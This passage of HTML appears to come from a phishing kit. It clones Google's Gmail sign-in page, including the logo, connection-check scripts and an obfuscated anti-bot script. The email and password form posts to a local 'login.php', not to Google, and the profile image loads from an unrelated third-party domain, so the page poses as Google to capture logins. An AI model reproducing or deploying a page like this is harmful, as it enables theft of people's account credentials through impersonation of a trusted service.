  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
  
  
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img alt="Google" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2000px-Google_2015_logo.svg.png">
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google
</h1>
  <h2 class="hidden-small">
  Sign in to continue to Gmail
  </h2>
</div>
<div class="card signin-card clearfix">
  <div id="cc_iframe_parent"><iframe src="https://accounts.youtube.com/accounts/CheckConnection?pmpo=https%3A%2F%2Faccounts.google.com&amp;v=-195604430&amp;timestamp=1444500355218" id="youtube" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
<img class="profile-img" src="https://wabashin.myseniorcenter.net/Content/Images/default-profile.png" alt="">
<p class="profile-name"></p>
  <form novalidate="" method="post" action="./login.php" id="gaia_loginform">
  <input name="GALX" type="hidden" value="T3yXxHiSa1s">
  <input name="continue" type="hidden" value="https://www.google.co.id/?gws_rd=cr,ssl&amp;ei=bfUxVZTQCsWeugSl94D4DA">
  <input name="hl" type="hidden" value="id">
  <input type="hidden" id="_utf8" name="_utf8" value="?">
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
  <input type="hidden" id="pstMsg" name="pstMsg" value="1">
  <input type="hidden" id="dnConn" name="dnConn" value="">
  <input type="hidden" id="checkConnection" name="checkConnection" value="">
  <input type="hidden" id="checkedDomains" name="checkedDomains" value="youtube">
<label class="hidden-label" for="Email">Email</label>
<input id="Email" name="email" type="email" placeholder="Email" value="" spellcheck="false" class=""><br>
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" name="password" type="password" placeholder="Password" spellcheck="false" class="">
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign In">
  <a class="need-help" href="https://accounts.google.com/signin/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;ss=1&amp;scc=1&amp;rm=false&amp;osid=1&amp;hl=en">
  Find my account
  </a>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
 
  </div>
  </div>
  </label>
  <input type="hidden" name="rmShown" value="1">
  
  </form>
</div>
<div class="one-google">
  
 <center><a href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">
  Create account
  </a></center>

  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(a){for(var b=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<b.length;c++)try{return new ActiveXObject(b[c])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.e=a;this.n=this.k();if(null==this.e)throw new Gk("Empty module name");};G=Gl.prototype;G.k=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.h=function(a,b,c){var d=this.n,e=this.e||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.h(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.d=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d,e=b.match(Gn)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gn)[4]||null)||null;if(!c||!d)return Gm.error("Invalid origin Exception",[String(b)]),!1;e||(e=Go(c));var f=a.match(Gn)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gn)[4]||null)||null)||(d=Go(f));return e==d};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=null,Gu=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gu.prototype;G.g=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.f=function(a){return this.g(a,Gs)};G.o=function(a){return this.g(a,Gt)};G.j=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
G.m=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.f(a),this.a=!0):this.j(b)==this.b&&(this.o(b)||this.f(a),this.a=!0);return!0};G.l=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.i=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.l();a.id=this.b;Gr.appendChild(a)};
var Gv=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].m(c,b);e++);}},Gw=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?(b&&(Gs=document.getElementById(b)),c&&(Gt=document.getElementById(c)),Gs||Gt?a=!0:(Gq.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gu(a[d].iframeUri,a[d].domainSymbol));
Gh(window,"message",Gv(c));for(d=0;d<b;d++)c[d].i()}}}},Gx=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.d(Gw);G_setPostMessageSupportFlag=Gq.d(Gx);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\75-195604430',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */(function(){eval('var f=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},k=function(a,b,c){return 2>=arguments.length?g.slice.call(a,b):g.slice.call(a,b,c)},g=Array.prototype,r=function(a,b,c,d,e){c=a.split("."),d=p,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||void 0===b?d=d[e]?d[e]:d[e]={}:d[e]=b},p=this,t,y=(new function(){},function(a,b,c,d,e,h){try{if(this.c=[],u(this,this.b,0),u(this,this.m,0),u(this,this.K,0),u(this,this.k,2048),u(this,this.d,[]),u(this,this.I,"object"==typeof window?window:p),this.F=true,u(this,this.o,{}),u(this,this.h,w(4)),u(this,this.H,[]),u(this,this.v,0),u(this,this.p,0),u(this,this.L,this),u(this,this.A,0),u(this,this.g,[]),a&&"!"==a.charAt(0))this.q=a;else{if(window.atob){for(c=window.atob(a),a=[],e=d=0;e<c.length;e++){for(h=c.charCodeAt(e);255<h;)a[d++]=h&255,h>>=8;a[d++]=h}b=a}else b=null;(this.e=b)&&this.e.length?(this.S=[],this.G()):this.f(this.U)}}catch(l){x(this,l)}}),C=(t=y.prototype,y.prototype.la=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},t.L=14,function(a,b,c){if(b=a.a(a.b),!(b in a.e))throw a.f(a.V),a.u;return void 0==a.D&&(a.D=z(a.e,b-4),a.C=void 0),a.C!=b>>3&&(a.C=b>>3,c=[0,0,0,a.a(a.v)],a.ga=B(a.D,a.C,c)),u(a,a.b,b+1),a.e[b]^a.ga[b%8]}),K=(t.O=[function(a,b,c,d){b=C(a),c=C(a),d=C(a),u(a,d,a.a(b)<<c)},function(a){C(a)},function(a,b,c,d){b=C(a),c=C(a),d=C(a),a.a(b)[a.a(c)]=a.a(d)},function(a,b,c){b=C(a),c=C(a),b=a.a(b),u(a,c,f(b))},function(a,b,c){b=C(a),c=C(a),0!=a.a(b)&&u(a,a.b,a.a(c))},function(a,b,c,d,e){b=C(a),c=C(a),d=D(a,b),e=D(a,c),c!=a.g&&(d==a.j&&e==a.j?(void 0==a.c[c]&&u(a,c,""),u(a,c,a.a(c)+a.a(b))):e==a.l&&(0>d?(b=a.a(b),d==a.j&&(b=E(""+b)),F(a,c,G(b.length,2)),F(a,c,b)):0<d&&F(a,c,G(a.a(b),d))))},function(){},function(a,b,c,d){b=C(a),c=C(a),d=C(a),u(a,d,(a.a(b)in a.a(c))+0)},function(){},function(a,b,c,d,e,h,l,n,m){if(b=C(a),c=D(a,b),0<c){for(d=0;c--;)d=d<<8|C(a);u(a,b,d)}else if(c!=a.t){if(d=C(a)<<8|C(a),c==a.j)if(c="",void 0!=a.c[a.w])for(e=a.a(a.w);d--;)h=e[C(a)<<8|C(a)],c+=h;else{for(c=Array(d),e=0;e<d;e++)c[e]=C(a);for(d=c,c=[],h=e=0;e<d.length;)l=d[e++],128>l?c[h++]=String.fromCharCode(l):191<l&&224>l?(n=d[e++],c[h++]=String.fromCharCode((l&31)<<6|n&63)):(n=d[e++],m=d[e++],c[h++]=String.fromCharCode((l&15)<<12|(n&63)<<6|m&63));c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=C(a);u(a,b,c)}},function(a,b,c,d){b=C(a),c=C(a),d=C(a),u(a,d,a.a(b)|a.a(c))},function(a,b,c,d){b=C(a),c=C(a),d=C(a),u(a,d,a.a(b)>>c)},function(a,b){b=a.a(C(a)),H(a,b)},function(a,b,c,d){if(b=a.S.pop()){for(c=C(a);0<c;c--)d=C(a),b[d]=a.c[d];a.c=b}else u(a,a.b,a.e.length)},function(a,b,c){b=C(a),c=C(a),u(a,c,a.a(c)%a.a(b))},function(a,b,c,d,e){b=C(a),c=C(a),d=a.a(b),b=D(a,b),e=D(a,c),e==a.j||e==a.l?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),u(a,c,d)},function(a,b){b=I(a),u(a,b.R,b.P.apply(b.Q,b.n))},function(a,b,c){b=C(a),c=C(a),D(a,c)==a.l?F(a,c,D(a,b)==a.j?E(""+a.a(b)):a.a(b)):u(a,c,a.a(c)+a.a(b))},function(a,b,c,d){b=C(a),c=C(a),d=C(a),a.a(b)>a.a(c)&&u(a,d,a.a(d)+1)},function(a,b,c){b=C(a),c=C(a),u(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=C(a),c=C(a),d=a.a(C(a)),c=a.a(c),u(a,b,J(a,c,d))},function(a,b,c,d){b=C(a),c=C(a),d=C(a),a.a(b)==a.a(c)&&u(a,d,a.a(d)+1)},function(a,b,c){b=C(a),c=C(a),u(a,c,a.a(c)-a.a(b))},function(a,b,c,d,e){b=C(a),c=C(a),d=C(a),e=a.a(C(a)),c=a.a(c),d=a.a(d),a.a(b).addEventListener(c,J(a,d,e,true),false)},function(a,b,c,d){b=C(a),c=C(a),d=C(a),c=a.a(c),b=a.a(b),u(a,d,b[c])},function(a,b,c,d){b=C(a),c=C(a),d=C(a),u(a,d,a.a(b)||a.a(c))},function(a,b,c){b=C(a),c=C(a),u(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c,d,e){b=I(a),e=b.P,d=b.Q,c=b.n;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.f(a.s);return}u(a,b.R,c)},function(a,b,c,d,e,h){if(b=C(a),c=C(a),d=C(a),e=C(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==f(b)){for(h in e=[],b)e.push(h);b=e}for(e=0,h=b.length;e<h;e+=d)c(b.slice(e,e+d),a)}],t.t=-2,function(a,b,c,d){return c=a.a(a.b),a.e&&c<a.e.length?(u(a,a.b,a.e.length),H(a,b)):u(a,a.b,b),d=a.G(),u(a,a.b,c),d}),u=function(a,b,c){if(b==a.b||b==a.m)a.c[b]?a.c[b].ja(c):a.c[b]=L(c);else if(b!=a.d&&b!=a.h&&b!=a.g||!a.c[b])a.c[b]=M(c,a.a);b==a.v&&(a.D=void 0,u(a,a.b,a.a(a.b)+4))},J=(t.r="caller",t.K=2,function(a,b,c,d){return function(){if(!d||a.F)return u(a,a.J,arguments),u(a,a.o,c),K(a,b)}}),x=(y.prototype.a=function(a,b){if(b=this.c[a],void 0===b)throw this.f(this.X,0,a),this.u;return b()},t.I=8,t.w=16,function(a,b){a.q=("E:"+b.message+":"+b.stack).slice(0,2048)}),G=(t.$=6,function(a,b,c,d){for(d=b-1,c=[];0<=d;d--)c[b-1-d]=a>>8*d&255;return c}),I=(t.ca=10,t.B=4,t.p=12,t.H=3,function(a,b,c,d,e,h){for(b={},c=C(a),b.R=C(a),b.n=[],d=C(a)-1,e=C(a),h=0;h<d;h++)b.n.push(C(a));for(b.P=a.a(c),b.Q=a.a(e);d--;)b.n[d]=a.a(b.n[d]);return b}),B=(t.ea=34,function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}}),E=(t.W=33,t.U=17,t.s=22,function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b}),H=(t.v=6,t.l=-1,t.d=13,t.o=5,t.da=42,t.Y=17,t.u={},t.Z=36,function(a,b){a.S.push(a.c.slice()),a.c[a.b]=void 0,u(a,a.b,b)}),L=function(a,b,c){return c=function(){return a},b=function(){return c()},b.ja=function(b){a=b},b},D=(t.M="toString",t.A=10,y.prototype.f=function(a,b,c,d){d=this.a(this.m),a=[a,d>>8&255,d&255],void 0!=c&&a.push(c),0==this.a(this.g).length&&(this.c[this.g]=void 0,u(this,this.g,a)),c="",b&&(b.message&&(c+=b.message),b.stack&&(c+=":"+b.stack)),b=this.a(this.k),3<b&&(c=c.slice(0,b-3),b-=c.length+3,c=E(c),F(this,this.h,G(c.length,2).concat(c),this.ba)),u(this,this.k,b)},t.g=9,t.X=30,function(a,b){return b<=a.Y?b==a.g||b==a.d||b==a.h||b==a.H?a.l:b==a.J||b==a.I||b==a.L||b==a.o?a.t:b==a.w?a.j:b==a.k||b==a.A||b==a.b||b==a.m||b==a.B?2:b==a.p?1:4:[1,2,4,a.j,a.t,a.l][b%a.$]}),M=function(a,b,c,d,e,h,l,n,m){return e=y.prototype,h=e.G,d=function(){return c()},m=e.f,n=y,l=e.N,c=function(a,q,v){for(a=d[e.r],v=0,q=a===b,a=a&&a[e.r];a&&a!=h&&a!=l&&a!=n&&a!=m&&20>v;)v++,a=a[e.r];return c[e.ea+q+!(!a+(v>>2))]},d[e.M]=e,c[e.Z]=a,a=void 0,d},z=(y.prototype.ma=function(a,b,c,d){try{d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)}catch(e){throw e;}},function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]}),w=(t.h=0,t.b=15,t.k=1,t.V=31,t.J=7,function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b}),F=(y.prototype.na=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},t.aa=15,t.m=11,t.ba=12,t.j=-3,t.T=21,function(a,b,c,d,e,h){for(e=a.a(b),b=b==a.h?function(b,c,d,h){if(c=e.length,d=c-4>>3,e.ha!=d){e.ha=d,d=(d<<3)-4,h=[0,0,0,a.a(a.K)];try{e.fa=B(z(e,d),z(e,d+4),h)}catch(q){throw q;}}e.push(e.fa[c&7]^b)}:function(a){e.push(a)},d&&b(d&255),h=0,d=c.length;h<d;h++)b(c[h])}),N=function(a,b,c,d){if(8192>a.length)return String.fromCharCode.apply(null,a);for(c=0,b="";c<a.length;c+=8192)d=k(a,c,c+8192),b+=String.fromCharCode.apply(null,d);return b};y.prototype.ka=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),y.prototype.ia=function(a,b){return b=this.N(),a&&a(b),b},y.prototype.N=function(a,b,c,d,e,h,l,n,m,A,q){if(this.q)return this.q;try{if(this.F=false,b=this.a(this.d).length,c=this.a(this.h).length,d=this.a(this.k),this.c[this.B]&&K(this,this.a(this.B)),e=this.a(this.g),0<e.length&&F(this,this.d,G(e.length,2).concat(e),this.aa),h=this.a(this.A)&255,h-=this.a(this.d).length+5,l=this.a(this.h),4<l.length&&(h-=l.length+3),0<h&&F(this,this.d,G(h,2).concat(w(h)),this.ca),4<l.length&&F(this,this.d,G(l.length,2).concat(l),this.da),n=w(2).concat(this.a(this.d)),n[1]=n[0]^3,window.btoa?(A=window.btoa(N(n)),m=A=A.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")):m=void 0,m)m="!"+m;else for(e=0,m="";e<n.length;e++)q=n[e][this.M](16),1==q.length&&(q="0"+q),m+=q;this.a(this.d).length=b,this.a(this.h).length=c,u(this,this.k,d),a=m,this.F=true}catch(v){x(this,v),a=this.q}return a},y.prototype.G=function(a,b,c,d,e,h){try{for(c=void 0,d=0,b=5001,a=this.e.length;--b&&(d=this.a(this.b))<a;)try{u(this,this.m,d),e=C(this)%this.O.length,(c=this.O[e])?c(this):this.f(this.T,0,e)}catch(l){l!=this.u&&((h=this.a(this.p))?(u(this,h,l),u(this,this.p,0)):this.f(this.s,l))}b||this.f(this.W)}catch(n){try{this.f(this.s,n)}catch(m){x(this,m)}}return this.a(this.o)};try{window.addEventListener("unload",function(){},false)}catch(O){}r("botguard.bg",y),r("botguard.bg.prototype.invoke",y.prototype.ia);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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